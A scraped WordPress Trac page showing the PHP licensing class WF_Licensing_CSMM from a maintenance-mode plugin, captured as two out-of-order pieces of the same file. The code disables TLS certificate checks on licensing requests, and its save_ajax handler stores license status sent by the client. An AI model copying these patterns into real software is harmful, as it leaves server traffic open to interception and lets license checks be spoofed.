| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_c2cf75fd_20250111_113433.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
